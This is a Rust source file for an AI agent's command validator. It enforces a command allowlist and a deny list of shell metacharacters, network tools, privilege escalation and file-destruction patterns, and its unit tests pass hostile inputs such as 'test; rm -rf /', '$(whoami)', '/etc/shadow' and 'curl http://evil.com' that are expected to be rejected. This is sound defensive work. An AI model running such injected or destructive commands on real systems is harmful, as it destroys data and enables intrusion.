//! Unified Command Validator
//!
//! This module provides a centralized command validation system that consolidates
//! all command security checks across the fluent-agent crate. It combines patterns
//! from lib.rs, tools/mod.rs, and is also used by fluent-engines pipeline executor.
//!
//! ## Security Features
//!
//! - **Command Whitelisting**: Only explicitly allowed commands can be executed
//! - **Dangerous Pattern Detection**: Comprehensive checks for command injection, path traversal, etc.
//! - **Argument Validation**: Validates all command arguments for dangerous patterns
//! - **Length Limits**: Prevents buffer overflow attacks
//! - **Environment-Based Configuration**: Allows runtime security policy configuration

use anyhow::{anyhow, Result};
use std::env;

/// Unified command validator that checks commands and arguments against security policies
pub struct CommandValidator {
    /// List of commands that are explicitly allowed to run
    allowed_commands: Vec<String>,
    /// Maximum allowed length for command names
    max_command_length: usize,
    /// Maximum allowed length for individual arguments
    max_arg_length: usize,
    /// Dangerous patterns to detect in commands and arguments
    dangerous_patterns: Vec<&'static str>,
}

impl CommandValidator {
    /// Create a new CommandValidator with the specified allowed commands
    ///
    /// # Arguments
    ///
    /// * `allowed_commands` - Vector of command names that are permitted to execute
    ///
    /// # Example
    ///
    /// ```
    /// use fluent_agent::security::command_validator::CommandValidator;
    ///
    /// let validator = CommandValidator::new(vec![
    ///     "cargo".to_string(),
    ///     "rustc".to_string(),
    ///     "ls".to_string(),
    /// ]);
    /// ```
    pub fn new(allowed_commands: Vec<String>) -> Self {
        Self {
            allowed_commands,
            max_command_length: 100,
            max_arg_length: 1000,
            dangerous_patterns: Self::get_dangerous_patterns(),
        }
    }

    /// Create a CommandValidator with default allowed commands for agent operations
    ///
    /// Default commands are production-safe and suitable for most agent use cases.
    pub fn with_defaults() -> Self {
        let allowed_commands = vec![
            "cargo".to_string(),
            "rustc".to_string(),
            "git".to_string(),
            "ls".to_string(),
            "cat".to_string(),
            "echo".to_string(),
            "pwd".to_string(),
            "which".to_string(),
            "find".to_string(),
        ];
        Self::new(allowed_commands)
    }

    /// Create a CommandValidator based on environment variables
    ///
    /// Checks the following environment variables:
    /// - `FLUENT_ALLOWED_COMMANDS`: Comma-separated list of allowed commands
    /// - `FLUENT_AGENT_CONTEXT`: Context-specific command sets (development, testing, production)
    ///
    /// Falls back to defaults if environment variables are not set or invalid.
    pub fn from_environment() -> Self {
        let allowed_commands = Self::get_allowed_commands_from_env();
        Self::new(allowed_commands)
    }

    /// Validate a command and its arguments against security policies
    ///
    /// # Arguments
    ///
    /// * `command` - The command name to validate
    /// * `args` - Slice of argument strings to validate
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If validation passes
    /// * `Err(anyhow::Error)` - If validation fails, with a descriptive error message
    ///
    /// # Example
    ///
    /// ```no_run
    /// use fluent_agent::security::command_validator::CommandValidator;
    ///
    /// let validator = CommandValidator::with_defaults();
    /// let args = vec!["build".to_string(), "--release".to_string()];
    /// validator.validate("cargo", &args)?;
    /// # Ok::<(), anyhow::Error>(())
    /// ```
    pub fn validate(&self, command: &str, args: &[String]) -> Result<()> {
        // Validate command name
        self.validate_command_name(command)?;

        // Check if command is in allowlist
        self.check_allowlist(command)?;

        // Check for dangerous patterns in command
        self.check_dangerous_patterns(command)?;

        // Validate all arguments
        self.validate_arguments(args)?;

        Ok(())
    }

    /// Validate command name basic properties
    fn validate_command_name(&self, cmd: &str) -> Result<()> {
        // Check for empty command
        if cmd.is_empty() {
            return Err(anyhow!("Command cannot be empty"));
        }

        // Check command length
        if cmd.len() > self.max_command_length {
            return Err(anyhow!(
                "Command name too long: {} characters (max: {})",
                cmd.len(),
                self.max_command_length
            ));
        }

        // Must start with alphanumeric character
        if let Some(first_char) = cmd.chars().next() {
            if !first_char.is_ascii_alphanumeric() {
                return Err(anyhow!(
                    "Command must start with alphanumeric character, got: '{}'",
                    first_char
                ));
            }
        }

        // Check for valid command name characters (alphanumeric, dash, underscore only)
        if !cmd
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        {
            return Err(anyhow!(
                "Command contains invalid characters (only alphanumeric, dash, and underscore allowed)"
            ));
        }

        // Additional safety checks
        if cmd.contains('/') || cmd.contains('\\') {
            return Err(anyhow!("Command cannot contain path separators"));
        }

        if cmd.contains(' ') {
            return Err(anyhow!("Command cannot contain spaces"));
        }

        if cmd.starts_with('-') || cmd.starts_with('.') {
            return Err(anyhow!("Command cannot start with '-' or '.'"));
        }

        Ok(())
    }

    /// Check if command is in the allowlist
    fn check_allowlist(&self, cmd: &str) -> Result<()> {
        if !self.allowed_commands.iter().any(|allowed| allowed == cmd) {
            return Err(anyhow!(
                "Command '{}' not in allowed list. Allowed commands: {:?}",
                cmd,
                self.allowed_commands
            ));
        }
        Ok(())
    }

    /// Check for dangerous patterns in input
    fn check_dangerous_patterns(&self, input: &str) -> Result<()> {
        let input_lower = input.to_lowercase();

        for pattern in &self.dangerous_patterns {
            if input_lower.contains(pattern) {
                return Err(anyhow!(
                    "Input contains dangerous pattern '{}': {}",
                    pattern,
                    input
                ));
            }
        }

        // Check for null bytes and control characters
        if input.contains('\0') {
            return Err(anyhow!("Input contains null byte"));
        }

        if input
            .chars()
            .any(|c| c.is_control() && c != '\n' && c != '\t' && c != '\r')
        {
            return Err(anyhow!("Input contains invalid control characters"));
        }

        Ok(())
    }

    /// Validate all command arguments
    fn validate_arguments(&self, args: &[String]) -> Result<()> {
        for (idx, arg) in args.iter().enumerate() {
            // Check argument length
            if arg.len() > self.max_arg_length {
                return Err(anyhow!(
                    "Argument {} too long: {} characters (max: {})",
                    idx,
                    arg.len(),
                    self.max_arg_length
                ));
            }

            // Check for dangerous patterns in argument
            self.check_dangerous_patterns(arg)?;
        }

        Ok(())
    }

    /// Get comprehensive list of dangerous patterns
    ///
    /// This combines patterns from all three original implementations:
    /// - lib.rs: Character-level patterns
    /// - tools/mod.rs: Comprehensive security patterns
    /// - pipeline/command_executor.rs: Shell metacharacters
    fn get_dangerous_patterns() -> Vec<&'static str> {
        vec![
            // Command injection patterns
            "$(",
            "`",
            ";",
            "&&",
            "||",
            "|",
            ">",
            ">>",
            "<",
            "<<",
            // Path traversal patterns
            "../",
            "./",
            "~",
            "/etc/",
            "/proc/",
            "/sys/",
            "/dev/",
            // Privilege escalation (checking for both with and without space for robustness)
            "sudo",
            "su ",
            "doas",
            "pkexec",
            // Network operations
            "curl",
            "wget",
            "nc",
            "netcat",
            "telnet",
            "ssh",
            "scp",
            "ftp",
            // File destruction - check arguments for these flags
            "rm ",
            "rm\t",
            "rmdir",
            "del ",
            "format",
            "mkfs",
            "dd ",
            "dd\t",
            "-rf",
            "-fr", // Common dangerous rm flags
            // Process control
            "kill",
            "killall",
            "pkill",
            "&",
            "nohup",
            // Script execution
            "bash",
            "sh ",
            "sh\t",
            "zsh",
            "python",
            "perl",
            "ruby",
            "node",
            "eval",
            "exec",
            "source",
            ". ",
            // Additional dangerous patterns
            "\n",
            "\r",
            "\t",
            "//",
            "/.",
            "/bin/",
            "/sbin/",
            "/usr/bin/",
            "/usr/sbin/",
            "*",
            "?",
            "[",
            "]",
            "{",
            "}",
            "(",
            ")",
        ]
    }

    /// Get allowed commands from environment variables
    fn get_allowed_commands_from_env() -> Vec<String> {
        // Check for custom allowed commands
        if let Ok(custom_commands) = env::var("FLUENT_ALLOWED_COMMANDS") {
            tracing::info!(
                "Custom allowed commands from environment: {}",
                custom_commands
            );

            let parsed_commands: Vec<String> = custom_commands
                .split(',')
                .map(|cmd| cmd.trim().to_string())
                .filter(|cmd| !cmd.is_empty() && Self::is_valid_command_name(cmd))
                .collect();

            if !parsed_commands.is_empty() {
                tracing::info!("Using {} custom allowed commands", parsed_commands.len());
                return parsed_commands;
            } else {
                tracing::warn!(
                    "No valid commands found in FLUENT_ALLOWED_COMMANDS, using defaults"
                );
            }
        }

        // Check for context-specific allowlists
        if let Ok(context) = env::var("FLUENT_AGENT_CONTEXT") {
            match context.as_str() {
                "development" => {
                    tracing::info!("Using development context command allowlist");
                    return vec![
                        "cargo".to_string(),
                        "rustc".to_string(),
                        "git".to_string(),
                        "ls".to_string(),
                        "cat".to_string(),
                        "echo".to_string(),
                        "pwd".to_string(),
                        "which".to_string(),
                        "find".to_string(),
                        "mkdir".to_string(),
                        "touch".to_string(),
                        "rm".to_string(), // Only in development context
                    ];
                }
                "testing" => {
                    tracing::info!("Using testing context command allowlist");
                    return vec![
                        "cargo".to_string(),
                        "rustc".to_string(),
                        "echo".to_string(),
                        "cat".to_string(),
                        "ls".to_string(),
                        "pwd".to_string(),
                        "which".to_string(),
                        "find".to_string(),
                        "mkdir".to_string(),
                        "touch".to_string(),
                    ];
                }
                _ => {
                    tracing::info!("Using production context command allowlist");
                }
            }
        }

        // Default production-safe commands
        vec![
            "cargo".to_string(),
            "rustc".to_string(),
            "git".to_string(),
            "ls".to_string(),
            "cat".to_string(),
            "echo".to_string(),
            "pwd".to_string(),
            "which".to_string(),
            "find".to_string(),
        ]
    }

    /// Check if a string is a valid command name (basic validation)
    fn is_valid_command_name(cmd: &str) -> bool {
        if cmd.is_empty() || cmd.len() > 50 {
            return false;
        }

        // Must start with alphanumeric
        if !cmd.chars().next().unwrap_or(' ').is_ascii_alphanumeric() {
            return false;
        }

        // Only allow safe characters
        cmd.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
            && !cmd.contains('/')
            && !cmd.contains('\\')
            && !cmd.contains(' ')
    }

    /// Get the list of allowed commands
    pub fn allowed_commands(&self) -> &[String] {
        &self.allowed_commands
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validator_with_defaults() {
        let validator = CommandValidator::with_defaults();
        assert!(!validator.allowed_commands.is_empty());
        assert!(validator.allowed_commands.contains(&"cargo".to_string()));
    }

    #[test]
    fn test_validate_allowed_command() {
        let validator = CommandValidator::new(vec!["cargo".to_string(), "ls".to_string()]);

        // Valid commands should pass
        assert!(validator.validate("cargo", &[]).is_ok());
        assert!(validator.validate("ls", &[]).is_ok());
    }

    #[test]
    fn test_validate_disallowed_command() {
        let validator = CommandValidator::new(vec!["cargo".to_string()]);

        // Disallowed command should fail
        let result = validator.validate("rm", &[]);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("not in allowed list"));
    }

    #[test]
    fn test_validate_command_with_dangerous_patterns() {
        let validator = CommandValidator::new(vec!["echo".to_string()]);

        // Command injection patterns
        assert!(validator
            .validate("echo", &["$(whoami)".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["`whoami`".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["test; rm -rf /".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["test && rm file".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["test || rm file".to_string()])
            .is_err());

        // Redirection
        assert!(validator
            .validate("echo", &["test > file".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["test >> file".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["test < file".to_string()])
            .is_err());

        // Path traversal
        assert!(validator
            .validate("echo", &["../etc/passwd".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["~/secrets".to_string()])
            .is_err());
        assert!(validator
            .validate("echo", &["/etc/shadow".to_string()])
            .is_err());
    }

    #[test]
    fn test_validate_privilege_escalation() {
        let validator = CommandValidator::new(vec!["test".to_string()]);

        assert!(validator
            .validate("test", &["sudo rm".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["su root".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["doas command".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["pkexec cmd".to_string()])
            .is_err());
    }

    #[test]
    fn test_validate_network_operations() {
        let validator = CommandValidator::new(vec!["test".to_string()]);

        assert!(validator
            .validate("test", &["curl http://evil.com".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["wget http://evil.com".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["nc 127.0.0.1".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["ssh user@host".to_string()])
            .is_err());
    }

    #[test]
    fn test_validate_file_destruction() {
        let validator = CommandValidator::new(vec!["test".to_string()]);

        assert!(validator.validate("test", &["rm -rf".to_string()]).is_err());
        assert!(validator
            .validate("test", &["rmdir dir".to_string()])
            .is_err());
        assert!(validator
            .validate("test", &["dd if=/dev/zero".to_string()])
            .is_err());
    }

    #[test]
    fn test_validate_command_length() {
        let validator = CommandValidator::new(vec!["a".repeat(200)]);

        let long_cmd = "a".repeat(200);
        let result = validator.validate(&long_cmd, &[]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too long"));
    }

    #[test]
    fn test_validate_argument_length() {
        let validator = CommandValidator::new(vec!["echo".to_string()]);

        let long_arg = "a".repeat(2000);
        let result = validator.validate("echo", &[long_arg]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too long"));
    }

    #[test]
    fn test_validate_empty_command() {
        let validator = CommandValidator::new(vec!["test".to_string()]);

        let result = validator.validate("", &[]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("empty"));
    }

    #[test]
    fn test_validate_invalid_command_chars() {
        let validator = CommandValidator::new(vec!["test/cmd".to_string()]);

        assert!(validator.validate("test/cmd", &[]).is_err());
        assert!(validator.validate("test cmd", &[]).is_err());
        assert!(validator.validate("-test", &[]).is_err());
        assert!(validator.validate(".test", &[]).is_err());
    }

    #[test]
    fn test_validate_null_bytes() {
        let validator = CommandValidator::new(vec!["echo".to_string()]);

        let result = validator.validate("echo", &["test\0null".to_string()]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("null byte"));
    }

    #[test]
    fn test_validate_valid_arguments() {
        let validator = CommandValidator::new(vec!["cargo".to_string()]);

        // Valid arguments should pass
        let args = vec!["build".to_string(), "--release".to_string()];
        assert!(validator.validate("cargo", &args).is_ok());

        let args = vec!["test".to_string(), "--lib".to_string()];
        assert!(validator.validate("cargo", &args).is_ok());
    }

    #[test]
    fn test_is_valid_command_name() {
        assert!(CommandValidator::is_valid_command_name("cargo"));
        assert!(CommandValidator::is_valid_command_name("rustc"));
        assert!(CommandValidator::is_valid_command_name("my-command"));
        assert!(CommandValidator::is_valid_command_name("my_command"));

        assert!(!CommandValidator::is_valid_command_name(""));
        assert!(!CommandValidator::is_valid_command_name(
            "a".repeat(100).as_str()
        ));
        assert!(!CommandValidator::is_valid_command_name("/bin/ls"));
        assert!(!CommandValidator::is_valid_command_name("test cmd"));
        assert!(!CommandValidator::is_valid_command_name("-test"));
        assert!(!CommandValidator::is_valid_command_name("test;"));
    }
}
